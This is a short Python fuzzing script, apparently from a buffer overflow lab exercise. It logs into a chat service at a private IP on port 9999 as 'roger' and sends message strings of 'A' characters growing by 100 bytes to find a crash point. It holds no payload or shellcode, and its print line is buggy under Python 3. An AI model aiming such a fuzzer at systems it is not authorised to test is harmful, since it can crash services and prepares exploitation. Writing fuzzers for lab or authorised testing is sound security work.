import socket, time, sys

ip = "172.21.21.28"
port = 9999
timeout = 5

buffer = []
counter = 100
while len(buffer) < 70:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        print("Fuzzing Chat with %s bytes") % len(string)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        #Sending the username "roger"
        s.send('roger ' + "\r\n")
        s.recv(1024)
        #Sending the "A" charactes as a message Because fuzzing username did not work
        s.send(string)
        s.recv(1024)
        #waiting 1 second before continuing
        time.sleep(1)
        s.close()

    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
